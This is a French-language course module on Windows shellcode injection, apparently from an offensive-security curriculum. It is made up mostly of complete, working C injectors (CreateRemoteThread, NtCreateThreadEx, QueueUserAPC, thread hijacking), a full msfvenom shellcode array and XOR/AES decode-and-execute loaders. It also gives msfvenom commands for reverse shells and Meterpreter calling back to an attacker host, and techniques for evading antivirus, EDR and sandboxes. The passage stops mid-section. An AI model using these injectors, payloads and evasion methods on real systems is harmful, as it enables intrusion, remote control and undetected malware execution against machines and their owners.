# Module W28 : Shellcode Injection Windows

## Objectifs du module

- Comprendre ce qu'est un shellcode et son fonctionnement
- Maîtriser les différentes techniques d'injection de shellcode
- Implémenter des injections locales et distantes en C
- Comprendre le Position-Independent Code (PIC)
- Apprendre les techniques d'encodage et d'obfuscation
- Connaître les méthodes de détection et les bonnes pratiques OPSEC

---

## 1. Qu'est-ce qu'un Shellcode ?

### 1.1 Définition

Un **shellcode** est un petit fragment de code machine (opcodes bruts) conçu pour être injecté et exécuté dans un processus cible.

**Analogie :** Imaginez un virus informatique microscopique. Au lieu d'infecter un fichier entier, vous injectez juste quelques instructions assembleur directement dans la mémoire d'un programme en cours d'exécution.

### 1.2 Caractéristiques essentielles

```ascii
SHELLCODE TYPIQUE :

┌─────────────────────────────────────┐
│  Bytes bruts (opcodes x86/x64)     │
│  \xFC\x48\x83\xE4\xF0\xE8...       │
├─────────────────────────────────────┤
│  Propriétés :                       │
│  • Position-Independent (PIC)       │
│  • Sans sections (pas PE/ELF)       │
│  • Taille réduite (100-500 bytes)   │
│  • Auto-suffisant                   │
└─────────────────────────────────────┘
```

**Exemple visuel :**

```ascii
PROGRAMME NORMAL :          SHELLCODE :
┌──────────────┐           ┌──────────────┐
│ Headers PE   │           │ (rien)       │
│ Imports      │           │ \xFC\x48\x83 │
│ .text        │           │ \xE4\xF0\xE8 │
│ .data        │           │ ...          │
│ Relocs       │           │ (100 bytes)  │
└──────────────┘           └──────────────┘
   500 KB                      500 bytes
```

### 1.3 Types de shellcodes

1. **Bind Shell** : Ouvre un port et attend une connexion
2. **Reverse Shell** : Se connecte à l'attaquant
3. **Execute Command** : Lance cmd.exe, calc.exe, etc.
4. **Download & Execute** : Télécharge et lance un payload
5. **Meterpreter Staged** : Charge un agent Metasploit

---

## 2. Self-Injection vs Remote Injection

### 2.1 Self-Injection (Injection Locale)

Injection dans **notre propre processus**.

```ascii
AVANT :                    APRÈS :
┌─────────────┐           ┌─────────────┐
│ Notre.exe   │           │ Notre.exe   │
│             │           │             │
│ Code normal │   ───→    │ Code normal │
│             │           │ + Shellcode │
└─────────────┘           └─────────────┘
```

**Cas d'usage :**
- Bypasser des restrictions (AppLocker)
- Charger un payload depuis la mémoire
- Sandbox evasion

### 2.2 Remote Injection (Injection Distante)

Injection dans **un autre processus**.

```ascii
NOTRE PROCESSUS :         PROCESSUS CIBLE :
┌─────────────┐           ┌─────────────┐
│ Injector.exe│  ───────→ │ Explorer.exe│
│             │ Injection │             │
│ Code normal │           │ Code normal │
│             │           │ + Shellcode │
└─────────────┘           └─────────────┘
```

**Cas d'usage :**
- Process Hollowing
- Migration de payload
- Persistence
- Élévation de privilèges

---

## 3. Technique 1 : VirtualAllocEx + WriteProcessMemory + CreateRemoteThread

### 3.1 Principe

La technique **classique** d'injection de shellcode.

```ascii
ÉTAPES :

1. VirtualAllocEx()
   ┌─────────────────────────────┐
   │ Allouer mémoire RWX         │
   │ dans le processus cible     │
   └─────────────────────────────┘
           ↓
2. WriteProcessMemory()
   ┌─────────────────────────────┐
   │ Copier le shellcode         │
   │ dans la mémoire allouée     │
   └─────────────────────────────┘
           ↓
3. CreateRemoteThread()
   ┌─────────────────────────────┐
   │ Créer un thread pointant    │
   │ vers le shellcode           │
   └─────────────────────────────┘
           ↓
   EXÉCUTION DU SHELLCODE !
```

### 3.2 Code complet (Remote Injection)

```c
#include <windows.h>
#include <stdio.h>

// Shellcode : MessageBox "Hello from shellcode!"
// Généré avec msfvenom : msfvenom -p windows/x64/messagebox -f c
unsigned char shellcode[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
    "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
    "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
    "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
    "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
    "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
    "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
    "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
    "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
    "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
    "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
    "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
    "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
    "\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
    "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
    "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x48\x65\x6c"
    "\x6c\x6f\x20\x66\x72\x6f\x6d\x20\x73\x68\x65\x6c\x6c\x63\x6f"
    "\x64\x65\x21\x00";

BOOL InjectShellcode(DWORD targetPID) {
    HANDLE hProcess = NULL;
    LPVOID remoteBuffer = NULL;
    HANDLE hThread = NULL;
    SIZE_T shellcodeSize = sizeof(shellcode);

    printf("[*] Ouverture du processus PID %d...\n", targetPID);

    // 1. Ouvrir le processus cible
    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
        FALSE,
        targetPID
    );

    if (hProcess == NULL) {
        printf("[!] Erreur OpenProcess : %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Handle process : 0x%p\n", hProcess);

    // 2. Allouer de la mémoire RWX dans le processus cible
    remoteBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE  // RWX !
    );

    if (remoteBuffer == NULL) {
        printf("[!] Erreur VirtualAllocEx : %d\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Memoire allouee : 0x%p\n", remoteBuffer);

    // 3. Écrire le shellcode dans la mémoire allouée
    if (!WriteProcessMemory(
        hProcess,
        remoteBuffer,
        shellcode,
        shellcodeSize,
        NULL
    )) {
        printf("[!] Erreur WriteProcessMemory : %d\n", GetLastError());
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Shellcode ecrit (%zu bytes)\n", shellcodeSize);

    // 4. Créer un thread distant qui exécute le shellcode
    hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)remoteBuffer,  // Point d'entrée = shellcode
        NULL,
        0,
        NULL
    );

    if (hThread == NULL) {
        printf("[!] Erreur CreateRemoteThread : %d\n", GetLastError());
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Thread distant cree : 0x%p\n", hThread);
    printf("[*] Shellcode en cours d'execution...\n");

    // Attendre que le thread se termine
    WaitForSingleObject(hThread, INFINITE);

    // Nettoyage
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    printf("[+] Injection terminee !\n");
    return TRUE;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        printf("Exemple: %s 1234\n", argv[0]);
        return 1;
    }

    DWORD targetPID = atoi(argv[1]);

    printf("=== SHELLCODE INJECTOR ===\n");
    printf("[*] PID cible : %d\n\n", targetPID);

    if (InjectShellcode(targetPID)) {
        printf("\n[SUCCESS] Injection reussie !\n");
    } else {
        printf("\n[FAILED] Echec de l'injection.\n");
    }

    return 0;
}
```

### 3.3 Variante : Self-Injection

```c
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0..."; // Même shellcode

int main() {
    LPVOID mem = NULL;
    HANDLE hThread = NULL;

    printf("[*] Allocation memoire...\n");

    // Allouer dans notre propre processus
    mem = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (mem == NULL) {
        printf("[!] Erreur VirtualAlloc\n");
        return 1;
    }

    printf("[+] Memoire allouee : 0x%p\n", mem);

    // Copier le shellcode
    memcpy(mem, shellcode, sizeof(shellcode));
    printf("[+] Shellcode copie (%zu bytes)\n", sizeof(shellcode));

    // Créer un thread local
    hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)mem,
        NULL,
        0,
        NULL
    );

    if (hThread == NULL) {
        printf("[!] Erreur CreateThread\n");
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }

    printf("[+] Thread cree, shellcode en execution...\n");
    WaitForSingleObject(hThread, INFINITE);

    // Nettoyage
    CloseHandle(hThread);
    VirtualFree(mem, 0, MEM_RELEASE);

    printf("[+] Terminé\n");
    return 0;
}
```

---

## 4. Technique 2 : NtCreateThreadEx (NTDLL)

### 4.1 Principe

**Fonction non documentée** de NTDLL pour créer un thread distant.

**Avantages :**
- Plus bas niveau que CreateRemoteThread
- Moins surveillée par certains EDR
- Plus flexible (flags avancés)

```ascii
COMPARAISON :

CreateRemoteThread()          NtCreateThreadEx()
        ↓                            ↓
   kernel32.dll               ntdll.dll (Native API)
        ↓                            ↓
   ntdll.dll                   Appel syscall direct
        ↓                            ↓
    Syscall                     NT Kernel
```

### 4.2 Code complet

```c
#include <windows.h>
#include <stdio.h>

// Prototype de NtCreateThreadEx (non documentée)
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    LPVOID ObjectAttributes,
    HANDLE ProcessHandle,
    LPVOID lpStartAddress,
    LPVOID lpParameter,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    LPVOID pUnknown
);

unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0..."; // Votre shellcode

BOOL InjectWithNtCreateThreadEx(DWORD targetPID) {
    HANDLE hProcess = NULL;
    LPVOID remoteBuffer = NULL;
    HANDLE hThread = NULL;
    SIZE_T shellcodeSize = sizeof(shellcode);

    // Charger NtCreateThreadEx depuis ntdll.dll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[!] Erreur GetModuleHandle ntdll\n");
        return FALSE;
    }

    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(
        hNtdll,
        "NtCreateThreadEx"
    );

    if (NtCreateThreadEx == NULL) {
        printf("[!] Erreur GetProcAddress NtCreateThreadEx\n");
        return FALSE;
    }

    printf("[+] NtCreateThreadEx : 0x%p\n", NtCreateThreadEx);

    // Ouvrir le processus cible
    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
        FALSE,
        targetPID
    );

    if (hProcess == NULL) {
        printf("[!] Erreur OpenProcess : %d\n", GetLastError());
        return FALSE;
    }

    // Allouer mémoire
    remoteBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (remoteBuffer == NULL) {
        printf("[!] Erreur VirtualAllocEx\n");
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Buffer distant : 0x%p\n", remoteBuffer);

    // Écrire le shellcode
    if (!WriteProcessMemory(hProcess, remoteBuffer, shellcode, shellcodeSize, NULL)) {
        printf("[!] Erreur WriteProcessMemory\n");
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Shellcode ecrit\n");

    // Créer le thread avec NtCreateThreadEx
    NTSTATUS status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        remoteBuffer,  // Point d'entrée
        NULL,          // Pas de paramètre
        0,             // Flags : 0 = exécution immédiate
        0,
        0,
        0,
        NULL
    );

    if (status != 0) {
        printf("[!] Erreur NtCreateThreadEx : 0x%x\n", status);
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Thread cree avec NtCreateThreadEx\n");
    WaitForSingleObject(hThread, INFINITE);

    // Nettoyage
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return TRUE;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    DWORD targetPID = atoi(argv[1]);
    printf("[*] Injection NtCreateThreadEx vers PID %d\n", targetPID);

    if (InjectWithNtCreateThreadEx(targetPID)) {
        printf("[+] Injection reussie\n");
    }

    return 0;
}
```

---

## 5. Technique 3 : QueueUserAPC (Asynchronous Procedure Call)

### 5.1 Principe

Au lieu de créer un **nouveau thread**, on hijack un **thread existant** en ajoutant notre shellcode dans sa file APC (Asynchronous Procedure Call).

```ascii
THREAD CIBLE :

Boucle normale :
  ┌───────────────┐
  │ GetMessage()  │ ← Thread en attente (Alertable state)
  └───────────────┘
         ↓
  File APC :
  ┌───────────────┐
  │ Function1     │
  │ Function2     │
  │ NOTRE SHELLCO │ ← Ajouté avec QueueUserAPC !
  └───────────────┘
         ↓
  Quand le thread se réveille, il exécute les APC !
```

**Avantages :**
- Pas de nouveau thread (plus discret)
- Technique utilisée par des malwares avancés

**Inconvénients :**
- Le thread doit être en état "alertable"
- Exécution différée

### 5.2 Code complet

```c
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0..."; // Votre shellcode

// Trouver le premier thread d'un processus
DWORD GetFirstThreadId(DWORD pid) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    if (!Thread32First(snapshot, &te32)) {
        CloseHandle(snapshot);
        return 0;
    }

    do {
        if (te32.th32OwnerProcessID == pid) {
            CloseHandle(snapshot);
            return te32.th32ThreadID;
        }
    } while (Thread32Next(snapshot, &te32));

    CloseHandle(snapshot);
    return 0;
}

BOOL InjectWithQueueUserAPC(DWORD targetPID) {
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    LPVOID remoteBuffer = NULL;
    SIZE_T shellcodeSize = sizeof(shellcode);

    // Trouver un thread du processus cible
    DWORD threadId = GetFirstThreadId(targetPID);
    if (threadId == 0) {
        printf("[!] Aucun thread trouve\n");
        return FALSE;
    }

    printf("[+] Thread ID : %d\n", threadId);

    // Ouvrir le processus
    hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
        FALSE,
        targetPID
    );

    if (hProcess == NULL) {
        printf("[!] Erreur OpenProcess\n");
        return FALSE;
    }

    // Ouvrir le thread
    hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
    if (hThread == NULL) {
        printf("[!] Erreur OpenThread : %d\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Thread ouvert : 0x%p\n", hThread);

    // Allouer mémoire
    remoteBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (remoteBuffer == NULL) {
        printf("[!] Erreur VirtualAllocEx\n");
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Écrire le shellcode
    if (!WriteProcessMemory(hProcess, remoteBuffer, shellcode, shellcodeSize, NULL)) {
        printf("[!] Erreur WriteProcessMemory\n");
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Shellcode ecrit a : 0x%p\n", remoteBuffer);

    // Queue l'APC sur le thread
    if (QueueUserAPC((PAPCFUNC)remoteBuffer, hThread, 0) == 0) {
        printf("[!] Erreur QueueUserAPC : %d\n", GetLastError());
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] APC queued ! Le shellcode s'executera quand le thread sera alertable.\n");

    // Nettoyage
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return TRUE;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    DWORD targetPID = atoi(argv[1]);
    printf("[*] Injection QueueUserAPC vers PID %d\n\n", targetPID);

    if (InjectWithQueueUserAPC(targetPID)) {
        printf("\n[+] Injection APC reussie\n");
    }

    return 0;
}
```

---

## 6. Technique 4 : SetThreadContext (Thread Hijacking)

### 6.1 Principe

Détourner un thread existant en **modifiant son RIP** (Instruction Pointer) pour pointer vers notre shellcode.

```ascii
THREAD AVANT :                THREAD APRÈS :

RIP = 0x7FF12340            RIP = 0xDEADBEEF (notre shellcode)
  ↓                            ↓
Code légitime               Shellcode !
```

**Étapes :**
1. Suspendre un thread
2. Récupérer son contexte (GetThreadContext)
3. Modifier RIP pour pointer vers le shellcode
4. Restaurer le contexte (SetThreadContext)
5. Reprendre le thread

### 6.2 Code complet

```c
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0..."; // Votre shellcode

DWORD GetFirstThreadId(DWORD pid) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    if (!Thread32First(snapshot, &te32)) {
        CloseHandle(snapshot);
        return 0;
    }

    do {
        if (te32.th32OwnerProcessID == pid) {
            CloseHandle(snapshot);
            return te32.th32ThreadID;
        }
    } while (Thread32Next(snapshot, &te32));

    CloseHandle(snapshot);
    return 0;
}

BOOL InjectWithSetThreadContext(DWORD targetPID) {
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    LPVOID remoteBuffer = NULL;
    CONTEXT ctx;
    SIZE_T shellcodeSize = sizeof(shellcode);

    // Trouver un thread
    DWORD threadId = GetFirstThreadId(targetPID);
    if (threadId == 0) {
        printf("[!] Aucun thread trouve\n");
        return FALSE;
    }

    printf("[+] Thread ID : %d\n", threadId);

    // Ouvrir le processus
    hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
        FALSE,
        targetPID
    );

    if (hProcess == NULL) {
        printf("[!] Erreur OpenProcess\n");
        return FALSE;
    }

    // Ouvrir le thread avec droits élevés
    hThread = OpenThread(
        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
        FALSE,
        threadId
    );

    if (hThread == NULL) {
        printf("[!] Erreur OpenThread : %d\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    // Suspendre le thread
    if (SuspendThread(hThread) == (DWORD)-1) {
        printf("[!] Erreur SuspendThread\n");
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Thread suspendu\n");

    // Allouer mémoire
    remoteBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (remoteBuffer == NULL) {
        printf("[!] Erreur VirtualAllocEx\n");
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Écrire le shellcode
    if (!WriteProcessMemory(hProcess, remoteBuffer, shellcode, shellcodeSize, NULL)) {
        printf("[!] Erreur WriteProcessMemory\n");
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Shellcode ecrit a : 0x%p\n", remoteBuffer);

    // Récupérer le contexte du thread
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx)) {
        printf("[!] Erreur GetThreadContext : %d\n", GetLastError());
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] RIP original : 0x%llx\n", ctx.Rip);

    // Modifier RIP pour pointer vers le shellcode
    ctx.Rip = (DWORD64)remoteBuffer;

    // Restaurer le contexte modifié
    if (!SetThreadContext(hThread, &ctx)) {
        printf("[!] Erreur SetThreadContext : %d\n", GetLastError());
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] RIP modifie vers : 0x%p\n", remoteBuffer);

    // Reprendre le thread (il va exécuter le shellcode)
    if (ResumeThread(hThread) == (DWORD)-1) {
        printf("[!] Erreur ResumeThread\n");
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Thread repris, shellcode en execution !\n");

    // Nettoyage
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return TRUE;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    DWORD targetPID = atoi(argv[1]);
    printf("[*] Injection SetThreadContext vers PID %d\n\n", targetPID);

    if (InjectWithSetThreadContext(targetPID)) {
        printf("\n[+] Injection reussie\n");
    }

    return 0;
}
```

---

## 7. Position-Independent Code (PIC)

### 7.1 Problématique

Un shellcode doit fonctionner **peu importe l'adresse** où il est chargé en mémoire.

```ascii
PROBLÈME :

Code normal :
    call 0x401000  ← Adresse fixe, hardcodée

Shellcode :
    call 0x401000  ← ERREUR ! L'adresse change !
```

### 7.2 Solutions PIC

**1. Relatif offsets :**

```asm
; Au lieu de :
call 0x401000

; On utilise :
call $+5  ; Appel relatif (5 bytes après l'instruction courante)
```

**2. PEB Walking (Process Environment Block) :**

Technique pour trouver dynamiquement les adresses de kernel32.dll, ntdll.dll, etc.

```c
// Pseudo-code du PEB Walking
PPEB peb = __readgsqword(0x60);  // Récupérer le PEB (x64)
PPEB_LDR_DATA ldr = peb->Ldr;
// Parcourir la liste des DLL chargées
// Trouver kernel32.dll
// Trouver GetProcAddress
// Résoudre toutes les fonctions nécessaires
```

**3. Exemple shellcode PIC (ASM) :**

```asm
; Shellcode MessageBox PIC
section .text
global _start

_start:
    ; Récupérer le PEB
    mov rax, [gs:0x60]

    ; Trouver kernel32.dll (simplifié)
    ; ...

    ; Résoudre MessageBoxA
    ; ...

    ; Appeler MessageBoxA
    xor rcx, rcx        ; hWnd = NULL
    lea rdx, [rel msg]  ; Texte (relatif !)
    lea r8, [rel title] ; Titre (relatif !)
    xor r9, r9          ; Flags
    call rax            ; MessageBoxA

    ret

msg db "Hello!", 0
title db "Shellcode", 0
```

### 7.3 Génération avec msfvenom

```bash
# Générer un shellcode PIC MessageBox (x64)
msfvenom -p windows/x64/messagebox \
    TEXT="Pwned!" \
    TITLE="Shellcode" \
    -f c -o shellcode.txt

# Générer un reverse shell PIC
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=192.168.1.100 \
    LPORT=4444 \
    -f c -o revshell.txt
```

---

## 8. Encodage et Obfuscation

### 8.1 Pourquoi encoder ?

Les antivirus détectent les shellcodes par **signatures statiques**.

```ascii
SHELLCODE BRUT :
\xfc\x48\x83\xe4\xf0\xe8...  ← Détecté par signature !

SHELLCODE ENCODÉ XOR :
\x9f\x2b\xe0\x87\x93\x8b...  ← Signature cassée !
```

### 8.2 XOR Encoding (simple)

```c
#include <stdio.h>
#include <windows.h>

// Shellcode XOR-encodé avec clé 0xAA
unsigned char encoded_shellcode[] = "\x56\xe2\x29\x4e...";
unsigned char xor_key = 0xAA;

void DecodeAndExecute() {
    SIZE_T size = sizeof(encoded_shellcode);

    // Allouer mémoire
    LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Décoder
    for (int i = 0; i < size; i++) {
        ((unsigned char*)mem)[i] = encoded_shellcode[i] ^ xor_key;
    }

    printf("[+] Shellcode decode\n");

    // Exécuter
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
}

int main() {
    printf("[*] Decodage XOR...\n");
    DecodeAndExecute();
    return 0;
}
```

### 8.3 AES Encryption (avancé)

```c
#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>

#pragma comment(lib, "bcrypt.lib")

// Shellcode chiffré AES-256
unsigned char encrypted_shellcode[] = { /* ... */ };
unsigned char aes_key[32] = { /* ... */ };
unsigned char iv[16] = { /* ... */ };

BOOL DecryptAES(unsigned char* encrypted, SIZE_T encSize, unsigned char* decrypted) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    ULONG result = 0;

    // Ouvrir l'algorithme AES
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);

    // Importer la clé
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, aes_key, sizeof(aes_key), 0);

    // Déchiffrer
    BCryptDecrypt(hKey, encrypted, encSize, NULL, iv, sizeof(iv), decrypted, encSize, &result, 0);

    // Nettoyage
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return TRUE;
}

int main() {
    SIZE_T size = sizeof(encrypted_shellcode);

    // Allouer mémoire
    LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Déchiffrer
    printf("[*] Dechiffrement AES...\n");
    DecryptAES(encrypted_shellcode, size, (unsigned char*)mem);

    printf("[+] Shellcode dechiffre\n");

    // Exécuter
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}
```

### 8.4 Encoders msfvenom

```bash
# Liste des encoders disponibles
msfvenom --list encoders

# Encoder avec shikata_ga_nai (polymorphique)
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -e x64/xor_dynamic -i 5 \
    -f c -o encoded.txt

# Encoder plusieurs fois (layering)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -e x64/xor -i 3 \
    -e x64/zutto_dekiru -i 2 \
    -f c
```

---

## 9. Détection et OPSEC

### 9.1 Indicateurs de compromission (IoC)

**Ce qui est détecté par les EDR :**

```ascii
COMPORTEMENTS SUSPECTS :

1. VirtualAllocEx() + PAGE_EXECUTE_READWRITE
   ┌────────────────────────────────┐
   │ ALERTE : Allocation RWX !      │ ← EDR flag
   └────────────────────────────────┘

2. CreateRemoteThread() vers un autre processus
   ┌────────────────────────────────┐
   │ ALERTE : Injection détectée !  │
   └────────────────────────────────┘

3. WriteProcessMemory() suivi de CreateRemoteThread()
   ┌────────────────────────────────┐
   │ ALERTE : Pattern d'injection ! │
   └────────────────────────────────┘
```

### 9.2 Techniques d'évasion

**1. RW puis RX (au lieu de RWX) :**

```c
// Au lieu de :
VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

// Faire :
LPVOID mem = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(hProcess, mem, shellcode, size, NULL);

// Changer en RX après écriture
DWORD oldProtect;
VirtualProtectEx(hProcess, mem, size, PAGE_EXECUTE_READ, &oldProtect);
```

**2. Module Stomping (cacher le shellcode dans un module légitime) :**

```c
// Trouver une section .text dans ntdll.dll
HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
LPVOID caveAddress = FindCodeCave(hNtdll, shellcodeSize);

// Écrire le shellcode dans la "cave"
WriteProcessMemory(hProcess, caveAddress, shellcode, size, NULL);
CreateRemoteThread(hProcess, NULL, 0, caveAddress, NULL, 0, NULL);
```

**3. Utiliser des syscalls directs :**

```c
// Au lieu de VirtualAllocEx (kernel32)
// Appeler directement NtAllocateVirtualMemory (syscall)

NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);
```

**4. Sleep avant exécution (sandbox evasion) :**

```c
printf("[*] Attente 60 secondes (evasion)...\n");
Sleep(60000);  // Les sandboxes timeout souvent < 60s

// Puis injecter
InjectShellcode(targetPID);
```

**5. Vérifier si on est dans une VM :**

```c
